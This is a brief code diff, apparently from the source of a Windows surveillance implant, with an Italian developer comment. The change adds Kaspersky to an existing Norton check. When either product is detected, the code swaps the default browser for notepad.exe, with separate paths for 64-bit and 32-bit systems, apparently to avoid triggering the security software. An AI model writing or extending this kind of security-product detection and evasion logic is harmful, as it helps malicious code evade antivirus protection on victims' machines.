@@ -2497,7 +2497,7 @@ BOOL HM_GetDefaultBrowser(char *path_name)
 	char *params;
 
 	// XXX - Si incazza se si cerca di aprire il default browser
-	if (IsNortonInternetSecurity()) {
+	if (IsNortonInternetSecurity() || IsKaspersky()) {
 		if (IsX64System())
 			sprintf(path_name, "\"%s\"", "C:\\Windows\\SysWOW64\\notepad.exe");
 		else
